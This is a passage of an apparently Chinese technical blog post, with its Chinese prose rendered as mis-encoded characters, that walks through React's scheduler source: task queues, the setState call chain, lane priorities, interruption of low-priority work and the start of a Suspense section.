taskIdCounter++,<br>    callback,<br>    priorityLevel,<br>    startTime,<br>    expirationTime,<br>    <span class="hljs-attr">sortIndex</span>: -<span class="hljs-number">1</span>,<br>  &#125;;<br>  <span class="hljs-keyword">if</span> (enableProfiling) &#123;<br>    newTask.<span class="hljs-property">isQueued</span> = <span class="hljs-literal">false</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (startTime &gt; currentTime) &#123;<br>    <span class="hljs-comment">// This is a delayed task.</span><br>    newTask.<span class="hljs-property">sortIndex</span> = startTime;<br>    <span class="hljs-comment">// å°†ä»»åŠ¡æ’å…¥æœ€å°å †ï¼ˆæŒ‰expirationTimeæ’åºï¼‰</span><br>    <span class="hljs-title function_">push</span>(timerQueue, newTask);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">peek</span>(taskQueue) === <span class="hljs-literal">null</span> &amp;&amp; newTask === <span class="hljs-title function_">peek</span>(timerQueue)) &#123;<br>      <span class="hljs-comment">// All tasks are delayed, and this is the task with the earliest delay.</span><br>      <span class="hljs-keyword">if</span> (isHostTimeoutScheduled) &#123;<br>        <span class="hljs-comment">// Cancel an existing timeout.</span><br>        <span class="hljs-title function_">cancelHostTimeout</span>();<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        isHostTimeoutScheduled = <span class="hljs-literal">true</span>;<br>      &#125;<br>      <span class="hljs-comment">// Schedule a timeout.</span><br>      <span class="hljs-title function_">requestHostTimeout</span>(handleTimeout, startTime - currentTime);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    newTask.<span class="hljs-property">sortIndex</span> = expirationTime;<br>    <span class="hljs-title function_">push</span>(taskQueue, newTask);<br>    <span class="hljs-keyword">if</span> (enableProfiling) &#123;<br>      <span class="hljs-title function_">markTaskStart</span>(newTask, currentTime);<br>      newTask.<span class="hljs-property">isQueued</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-comment">// Schedule a host callback, if needed. If we&#x27;re already performing work,</span><br>    <span class="hljs-comment">// wait until the next time we yield.</span><br>    <span class="hljs-keyword">if</span> (!isHostCallbackScheduled &amp;&amp; !isPerformingWork) &#123;<br>      isHostCallbackScheduled = <span class="hljs-literal">true</span>;<br>      <span class="hljs-title function_">requestHostCallback</span>();<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> newTask;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>unstable_scheduleCallbackè¢«è°ƒç”¨è·¯å¾„</strong></p><p>unstable_scheduleCallback ä¸»è¦é€šè¿‡ä»¥ä¸‹è·¯å¾„è¢«è°ƒç”¨ï¼š</p><ol><li>çŠ¶æ€æ›´æ–°ï¼šsetStateã€useStateã€useReducerã€‚</li><li>å‰¯ä½œç”¨è°ƒåº¦ï¼šuseEffectã€useLayoutEffectã€‚</li><li>å¹¶å‘æ¨¡å¼ APIï¼šstartTransitionã€useDeferredValueã€‚</li><li>æ ¹èŠ‚ç‚¹æ¸²æŸ“ï¼šReactDOM.createRoot().render()ã€‚</li></ol><p><strong>æ ¸å¿ƒè°ƒç”¨é“¾è·¯</strong></p><p>ä»¥ setState ä¸ºä¾‹ï¼Œè°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">setState -&gt; enqueueSetState -&gt; scheduleUpdateOnFiber -&gt; ensureRootIsScheduled -&gt; ensureScheduleIsScheduled -&gt; scheduleImmediateRootScheduleTask -&gt; unstable_scheduleCallback -&gt; requestHostCallback -&gt; schedulePerformWorkUntilDeadline -&gt; port2.<span class="hljs-property">postMessage</span> -&gt; port1.<span class="hljs-property">onmessage</span> -&gt; performWorkUntilDeadline -&gt; flushWork<br><br><span class="hljs-title class_">Component</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">setState</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">partialState, callback</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">updater</span>.<span class="hljs-title function_">enqueueSetState</span>(<span class="hljs-variable language_">this</span>, partialState, callback, <span class="hljs-string">&#x27;setState&#x27;</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>class ç»„ä»¶åœ¨ç»§æ‰¿ React.Component æ—¶é€šè¿‡ constructor æŒ‡å®š <code>instance.updater = classComponentUpdater</code>ï¼ŒenqueueSetState å°±æ˜¯ classComponentUpdater å¯¹è±¡çš„å±æ€§æ–¹æ³•</p><p>ä»»åŠ¡è°ƒåº¦ï¼ˆunstable_scheduleCallbackï¼‰åˆ°ä»»åŠ¡æ‰§è¡Œï¼ˆperformUnitOfWorkï¼‰çš„å…³é”®åœ¨äº flushWork ä¸­ <code>currentTask.callback</code> çš„æ‰§è¡Œã€‚currentTask.callback æ˜¯è°ƒç”¨ unstable_scheduleCallback æ—¶ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°ï¼ˆ<code>unstable_scheduleCallback(ImmediateSchedulerPriority, processRootScheduleInImmediateTask)</code>ï¼‰:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">processRootScheduleInImmediateTask -&gt; performWorkOnRoot -&gt; renderRootConcurrent -&gt; workLoopConcurrentByScheduler -&gt; performUnitOfWork<br></code></pre></td></tr></table></figure><p>æ­¤å¤–ï¼ŒperformWorkOnRoot å‡½æ•°å†…åœ¨æ‰§è¡Œå®Œ renderRootConcurrent åä¼šè¿”å› exitStatus å€¼ï¼Œç”¨äºåˆ¤æ–­å®ŒæˆçŠ¶æ€ï¼Œè°ƒç”¨ finishConcurrentRender åæäº¤ commitRoot</p><h2 id="4-2-å¹¶å‘æ¨¡å¼ï¼ˆConcurrent-Modeï¼‰çš„åº•å±‚æ”¯æŒ"><a href="#4-2-å¹¶å‘æ¨¡å¼ï¼ˆConcurrent-Modeï¼‰çš„åº•å±‚æ”¯æŒ" class="headerlink" title="4.2 å¹¶å‘æ¨¡å¼ï¼ˆConcurrent Modeï¼‰çš„åº•å±‚æ”¯æŒ"></a>4.2 å¹¶å‘æ¨¡å¼ï¼ˆConcurrent Modeï¼‰çš„åº•å±‚æ”¯æŒ</h2><h3 id="é«˜ä¼˜å…ˆçº§æ›´æ–°çš„æ’é˜Ÿæœºåˆ¶ï¼ˆå¦‚ç”¨æˆ·è¾“å…¥ï¼‰"><a href="#é«˜ä¼˜å…ˆçº§æ›´æ–°çš„æ’é˜Ÿæœºåˆ¶ï¼ˆå¦‚ç”¨æˆ·è¾“å…¥ï¼‰" class="headerlink" title="é«˜ä¼˜å…ˆçº§æ›´æ–°çš„æ’é˜Ÿæœºåˆ¶ï¼ˆå¦‚ç”¨æˆ·è¾“å…¥ï¼‰"></a>é«˜ä¼˜å…ˆçº§æ›´æ–°çš„æ’é˜Ÿæœºåˆ¶ï¼ˆå¦‚ç”¨æˆ·è¾“å…¥ï¼‰</h3><p>Fiber é«˜ä¼˜å…ˆçº§ä»»åŠ¡çš„æ’é˜Ÿæœºåˆ¶ æ˜¯å¹¶å‘æ¨¡å¼ï¼ˆConcurrent Modeï¼‰çš„æ ¸å¿ƒç‰¹æ€§ä¹‹ä¸€ï¼Œå®ƒå…è®¸é«˜ä¼˜å…ˆçº§ä»»åŠ¡ï¼ˆå¦‚ç”¨æˆ·äº¤äº’ï¼‰ä¸­æ–­æ­£åœ¨æ‰§è¡Œçš„ä½ä¼˜å…ˆçº§ä»»åŠ¡ï¼ˆå¦‚æ•°æ®åŠ è½½ï¼‰</p><p>ä»¥ setState ä¸¾ä¾‹è¯´æ˜é«˜ä¼˜å…ˆçº§æ›´æ–°çš„æ’é˜Ÿæœºåˆ¶</p><p><strong>ä»»åŠ¡è°ƒåº¦</strong></p><p>å½“è§¦å‘ setState æ›´æ–°æ—¶ï¼š</p><ol><li>åˆ›å»º update å¯¹è±¡å¹¶æ ‡è®° lane</li><li>è°ƒç”¨ scheduleUpdateOnFiber å‘ä¸Šæ”¶é›†ä¼˜å…ˆçº§åˆ° root.pendingLanes</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">enqueueSetState</span>(<span class="hljs-params">inst: any, payload: any, callback</span>) &#123;<br>  <span class="hljs-keyword">const</span> fiber = <span class="hljs-title function_">getInstance</span>(inst);<br>  <span class="hljs-keyword">const</span> lane = <span class="hljs-title function_">requestUpdateLane</span>(fiber);<br>  <br>  <span class="hljs-keyword">const</span> update = <span class="hljs-title function_">createUpdate</span>(lane);<br>  update.<span class="hljs-property">payload</span> = payload;<br>  <span class="hljs-keyword">if</span> (callback !== <span class="hljs-literal">undefined</span> &amp;&amp; callback !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>      <span class="hljs-title function_">warnOnInvalidCallback</span>(callback);<br>    &#125;<br>    update.<span class="hljs-property">callback</span> = callback;<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> root = <span class="hljs-title function_">enqueueUpdate</span>(fiber, update, lane);<br>  <span class="hljs-keyword">if</span> (root !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-title function_">startUpdateTimerByLane</span>(lane, <span class="hljs-string">&#x27;this.setState()&#x27;</span>);<br>    <span class="hljs-title function_">scheduleUpdateOnFiber</span>(root, fiber, lane);<br>    <span class="hljs-title function_">entangleTransitions</span>(root, fiber, lane);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (enableSchedulingProfiler) &#123;<br>    <span class="hljs-title function_">markStateUpdateScheduled</span>(fiber, lane);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// react-reconciler/src/ReactFiberWorkLoop.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleUpdateOnFiber</span>(<span class="hljs-params">root, fiber, lane</span>) &#123;<br>  <span class="hljs-comment">// Mark that the root has a pending update.</span><br>  <span class="hljs-title function_">markRootUpdated</span>(root, lane); <span class="hljs-comment">// æ›´æ–° root.pendingLanes</span><br>  <span class="hljs-title function_">ensureRootIsScheduled</span>(root); <span class="hljs-comment">// è§¦å‘è°ƒåº¦</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ensureRootIsScheduled</span>(<span class="hljs-params">root: FiberRoot</span>): <span class="hljs-keyword">void</span> &#123;<br>  mightHavePendingSyncWork = <span class="hljs-literal">true</span>;<br>  <span class="hljs-title function_">ensureScheduleIsScheduled</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ensureScheduleIsScheduled</span>(<span class="hljs-params"></span>): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-comment">// åœ¨å½“å‰äº‹ä»¶ç»“æŸæ—¶ï¼Œéå†æ¯ä¸ªæ ¹ï¼Œå¹¶ç¡®ä¿ä»¥æ­£ç¡®çš„ä¼˜å…ˆçº§ä¸ºæ¯ä¸ªæ ¹å®‰æ’äº†ä¸€ä¸ªä»»åŠ¡</span><br>  <span class="hljs-comment">// didScheduleMicrotask ç”¨äºé˜²æ­¢è°ƒåº¦å†—ä½™çš„ mircotask</span><br>  <span class="hljs-keyword">if</span> (__DEV__ &amp;&amp; <span class="hljs-title class_">ReactSharedInternals</span>.<span class="hljs-property">actQueue</span> !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// We&#x27;re inside an `act` scope.</span><br>    <span class="hljs-keyword">if</span> (!didScheduleMicrotask_act) &#123;<br>      didScheduleMicrotask_act = <span class="hljs-literal">true</span>;<br>      <span class="hljs-title function_">scheduleImmediateRootScheduleTask</span>();<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (!didScheduleMicrotask) &#123;<br>      didScheduleMicrotask = <span class="hljs-literal">true</span>;<br>      <span class="hljs-title function_">scheduleImmediateRootScheduleTask</span>();<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleImmediateRootScheduleTask</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (supportsMicrotasks) &#123;<br>    <span class="hljs-title function_">scheduleMicrotask</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">processRootScheduleInMicrotask</span>();<br>    &#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// If microtasks are not supported, use Scheduler.</span><br>    <span class="hljs-title class_">Scheduler</span>_scheduleCallback(<br>      <span class="hljs-title class_">ImmediateSchedulerPriority</span>,<br>      processRootScheduleInImmediateTask,<br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¸­æ–­ä½ä¼˜å…ˆçº§ä»»åŠ¡ï¼ˆscheduleTaskForRootDuringMicrotaskï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">processRootScheduleInMicrotask</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">let</span> prev = <span class="hljs-literal">null</span>;<br>  <span class="hljs-comment">// 1. éå†å…¨å±€è°ƒåº¦é“¾è¡¨ï¼ˆfirstScheduledRoot â†’ lastScheduledRootï¼‰</span><br>  <span class="hljs-keyword">let</span> root = firstScheduledRoot;<br>  <span class="hljs-keyword">while</span> (root !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">const</span> next = root.<span class="hljs-property">next</span>;<br>    <span class="hljs-keyword">const</span> nextLanes = <span class="hljs-title function_">scheduleTaskForRootDuringMicrotask</span>(root, currentTime);<br>    <span class="hljs-keyword">if</span> (nextLanes === <span class="hljs-title class_">NoLane</span>) &#123;<br>      root.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span> (prev === <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// This is the new head of the list</span><br>        firstScheduledRoot = next;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        prev.<span class="hljs-property">next</span> = next;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (next === <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// This is the new tail of the list</span><br>        lastScheduledRoot = prev;<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// This root still has work. Keep it in the list.</span><br>      prev = root;<br>      <span class="hljs-keyword">if</span> (<br>        syncTransitionLanes !== <span class="hljs-title class_">NoLanes</span> ||<br>        <span class="hljs-title function_">includesSyncLane</span>(nextLanes) ||<br>        (enableGestureTransition &amp;&amp; <span class="hljs-title function_">isGestureRender</span>(nextLanes))<br>      ) &#123;<br>        mightHavePendingSyncWork = <span class="hljs-literal">true</span>;<br>      &#125;<br>    &#125;<br>    root = next;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleTaskForRootDuringMicrotask</span>(<span class="hljs-params"></span><br><span class="hljs-params">  root: FiberRoot,</span><br><span class="hljs-params">  currentTime: number,</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Lane</span> &#123;<br>  <span class="hljs-title function_">markStarvedLanesAsExpired</span>(root, currentTime);<br>  <span class="hljs-keyword">const</span> nextLanes = <span class="hljs-title function_">getNextLanes</span>(<br>    root,<br>    root === workInProgressRoot ? workInProgressRootRenderLanes : <span class="hljs-title class_">NoLanes</span>,<br>    rootHasPendingCommit);<br>  <br>  <span class="hljs-keyword">const</span> existingCallbackNode = root.<span class="hljs-property">callbackNode</span>;<br>  <span class="hljs-keyword">if</span> (<br>    nextLanes === <span class="hljs-title class_">NoLanes</span> ||<br>    (root === workInProgressRoot &amp;&amp; <span class="hljs-title function_">isWorkLoopSuspendedOnData</span>()) ||<br>    root.<span class="hljs-property">cancelPendingCommit</span> !== <span class="hljs-literal">null</span><br>  ) &#123;<br>    <span class="hljs-comment">// Fast path: There&#x27;s nothing to work on.</span><br>    <span class="hljs-keyword">if</span> (existingCallbackNode !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode);<br>    &#125;<br>    root.<span class="hljs-property">callbackNode</span> = <span class="hljs-literal">null</span>;<br>    root.<span class="hljs-property">callbackPriority</span> = <span class="hljs-title class_">NoLane</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NoLane</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (<br>    <span class="hljs-title function_">includesSyncLane</span>(nextLanes) &amp;&amp;<br>    <span class="hljs-comment">// If we&#x27;re prerendering, then we should use the concurrent work loop</span><br>    <span class="hljs-comment">// even if the lanes are synchronous, so that prerendering never blocks</span><br>    <span class="hljs-comment">// the main thread.</span><br>    !<span class="hljs-title function_">checkIfRootIsPrerendering</span>(root, nextLanes)<br>  ) &#123;<br>    <span class="hljs-comment">// Synchronous work is always flushed at the end of the microtask, so we</span><br>    <span class="hljs-comment">// don&#x27;t need to schedule an additional task.</span><br>    <span class="hljs-keyword">if</span> (existingCallbackNode !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode);<br>    &#125;<br>    root.<span class="hljs-property">callbackPriority</span> = <span class="hljs-title class_">SyncLane</span>;<br>    root.<span class="hljs-property">callbackNode</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">SyncLane</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// We use the highest priority lane to represent the priority of the callback.</span><br>    <span class="hljs-keyword">const</span> existingCallbackPriority = root.<span class="hljs-property">callbackPriority</span>;<br>    <span class="hljs-keyword">const</span> newCallbackPriority = <span class="hljs-title function_">getHighestPriorityLane</span>(nextLanes);<br><br>    <span class="hljs-keyword">if</span> (<br>      newCallbackPriority === existingCallbackPriority &amp;&amp;<br>      <span class="hljs-comment">// Special case related to `act`. If the currently scheduled task is a</span><br>      <span class="hljs-comment">// Scheduler task, rather than an `act` task, cancel it and re-schedule</span><br>      <span class="hljs-comment">// on the `act` queue.</span><br>      !(<br>        __DEV__ &amp;&amp;<br>        <span class="hljs-title class_">ReactSharedInternals</span>.<span class="hljs-property">actQueue</span> !== <span class="hljs-literal">null</span> &amp;&amp;<br>        existingCallbackNode !== fakeActCallbackNode<br>      )<br>    ) &#123;<br>      <span class="hljs-comment">// The priority hasn&#x27;t changed. We can reuse the existing task.</span><br>      <span class="hljs-keyword">return</span> newCallbackPriority;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// Cancel the existing callback. We&#x27;ll schedule a new one below.</span><br>      <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode);<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> newCallbackNode = <span class="hljs-title function_">scheduleCallback</span>(<br>      schedulerPriorityLevel,<br>      performWorkOnRootViaSchedulerTask.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, root),<br>    );<br><br>    root.<span class="hljs-property">callbackPriority</span> = newCallbackPriority;<br>    root.<span class="hljs-property">callbackNode</span> = newCallbackNode;<br>    <span class="hljs-keyword">return</span> newCallbackPriority;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ’é˜Ÿæœºåˆ¶å…³é”®è§£æ</strong></p><p>ï¼ˆ1ï¼‰æ ‡è®°è¿‡æœŸä»»åŠ¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">markStarvedLanesAsExpired</span>(root, currentTime);<br></code></pre></td></tr></table></figure><ul><li>ä½œç”¨ï¼šæ£€æŸ¥ root.pendingLanes ä¸­æ˜¯å¦æœ‰ä½ä¼˜å…ˆçº§ä»»åŠ¡å› é•¿æœŸæœªæ‰§è¡Œè€Œâ€œé¥¿æ­»â€ï¼ˆè¶…è¿‡ timeout æœªå¤„ç†ï¼‰</li><li>æ’é˜Ÿæœºåˆ¶ï¼šå°†è¿‡æœŸçš„ä½ä¼˜å…ˆçº§ä»»åŠ¡æ ‡è®°ä¸º expiredLanes ä½¿å…¶å‡çº§ä¸ºåŒæ­¥ä¼˜å…ˆçº§ï¼ˆSyncLaneï¼‰ä»è€Œè·å¾—ç«‹å³æ‰§è¡Œçš„æœºä¼š</li></ul><p>ï¼ˆ2ï¼‰è®¡ç®—ä¸‹ä¸€ä¸ªè¦å¤„ç†çš„ lanesï¼ˆgetNextLanesï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> nextLanes = <span class="hljs-title function_">getNextLanes</span>(<br>  root,<br>  root === workInProgressRoot ? workInProgressRootRenderLanes : <span class="hljs-title class_">NoLanes</span>,<br>  rootHasPendingCommit<br>);<br></code></pre></td></tr></table></figure><ul><li>ä¼˜å…ˆçº§æ¯”è¾ƒï¼šä» pendingLanes ä¸­é€‰æ‹©æœ€é«˜ä¼˜å…ˆçº§çš„ lanesï¼Œè§„åˆ™åŒ…æ‹¬ï¼š<ul><li>ä¼˜å…ˆé€‰æ‹©å·²è¿‡æœŸçš„ expiredLanesï¼ˆç›¸å½“äºå¼ºåˆ¶æ’é˜Ÿï¼‰</li><li>ç„¶åé€‰æ‹©ç”¨æˆ·äº¤äº’ç›¸å…³çš„ InputContinuousLane æˆ– DefaultLane</li><li>é¿å…ä¸æ­£åœ¨è¿›è¡Œçš„æ¸²æŸ“ä»»åŠ¡å†²çª</li></ul></li></ul><p>ï¼ˆ3ï¼‰ä¸­æ–­ä½ä¼˜å…ˆçº§</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (existingCallbackNode !== <span class="hljs-literal">null</span>) &#123;<br>  <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode); <span class="hljs-comment">// å–æ¶ˆå½“å‰æ­£åœ¨æ‰§è¡Œçš„ä½ä¼˜å…ˆçº§ä»»åŠ¡</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>å½“æ£€æµ‹åˆ°æ›´é«˜ä¼˜å…ˆçº§çš„ newCallbackPriority æ—¶ï¼Œç«‹å³å–æ¶ˆå½“å‰ä»»åŠ¡çš„å›è°ƒæ‰§è¡Œã€‚</li></ul><p>ï¼ˆ4ï¼‰è°ƒåº¦æ–°ä»»åŠ¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> newCallbackNode = <span class="hljs-title function_">scheduleCallback</span>(<br>  schedulerPriorityLevel,<br>  performWorkOnRootViaSchedulerTask.<span class="hljs-title function_">bind</span>(<span class="hljs-literal">null</span>, root)<br>);<br></code></pre></td></tr></table></figure><h3 id="Suspenseçš„å¼‚æ­¥æ¸²æŸ“æµç¨‹"><a href="#Suspenseçš„å¼‚æ­¥æ¸²æŸ“æµç¨‹" class="headerlink" title="Suspenseçš„å¼‚æ­¥æ¸²æŸ“æµç¨‹"></a>Suspenseçš„å¼‚æ­¥æ¸²æŸ“æµç¨‹</h3><p>Suspense çš„å¼‚æ­¥æ¸²æŸ“æµç¨‹ä¸»è¦å›´ç»• <code>å¼‚æ­¥æ•°æ®åŠ è½½</code> å’Œ <code>æ‡’åŠ è½½ç»„ä»¶ï¼ˆCode Splittingï¼‰</code> ä¸¤å¤§åœºæ™¯å±•å¼€ã€‚Suspense çš„å·¥ä½œåŸç†æ˜¯æ•è·å­ç»„ä»¶æŠ›å‡ºçš„ Promiseï¼Œå¹¶åœ¨ Promise æœªå®Œæˆæ—¶æ˜¾ç¤º fallback UIã€‚</p><p>å…¶å¼‚æ­¥çŠ¶æ€ç®¡ç†çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><ul><li>å½“å­ç»„ä»¶ï¼ˆå¦‚ lazy ç»„ä»¶æˆ–ä½¿ç”¨ use Hook çš„ç»„ä»¶ï¼‰éœ€è¦ç­‰å¾…å¼‚æ­¥æ“ä½œï¼ˆå¦‚æ•°æ®åŠ è½½æˆ–ä»£ç åŠ è½½ï¼‰æ—¶ï¼Œå®ƒä¼š æŠ›å‡ºä¸€ä¸ª Promiseã€‚</li><li>Suspense ä¼šæ•è·è¿™ä¸ª Promiseï¼Œå¹¶è¿›å…¥ æŒ‚èµ·ï¼ˆSuspendedï¼‰çŠ¶æ€ï¼Œæ˜¾ç¤º fallback UIã€‚</li><li>å½“ Promise å®Œæˆï¼ˆresolve æˆ– rejectï¼‰ï¼ŒReact ä¼šé‡æ–°å°è¯•æ¸²æŸ“å­ç»„ä»¶ã€‚</li></ul><p><strong>æ¸²æŸ“æµç¨‹è¯¦è§£</strong></p><p>ï¼ˆ1ï¼‰Code Splittingï¼ˆæ‡’åŠ è½½ç»„ä»¶ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">LazyComponent</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&quot;./Component&quot;</span>));<br></code></pre></td></tr></table></figure><ul><li>lazy 